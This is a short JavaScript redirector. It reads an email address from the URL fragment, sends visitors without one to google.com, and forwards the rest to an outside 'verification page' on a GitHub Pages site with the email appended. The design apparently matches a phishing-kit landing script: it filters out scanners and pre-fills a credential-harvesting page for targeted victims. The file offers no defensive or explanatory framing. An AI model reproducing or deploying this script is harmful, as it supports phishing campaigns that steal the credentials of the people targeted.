function enforceHTTPS() {
  if (window.location.protocol !== 'https:' && !window.location.hostname.includes('localhost')) {
    window.location.href = 'https:' + window.location.href.substring(window.location.protocol.length);
    return false;
  }
  return true;
}

function getEmailFromHash() {
  const hash = window.location.hash.substring(1); // Remove the #
  if (hash.includes("@") && hash.includes(".")) {
    return hash.trim();
  }
  return null;
}

window.onload = () => {
  if (!enforceHTTPS()) return;

  const email = getEmailFromHash();

  if (!email) {
    window.location.href = "https://google.com";
    return;
  }

  // Redirect to verification page with plain email in hash
  window.location.href = "https://hareru66.github.io/ref/#" + email;
};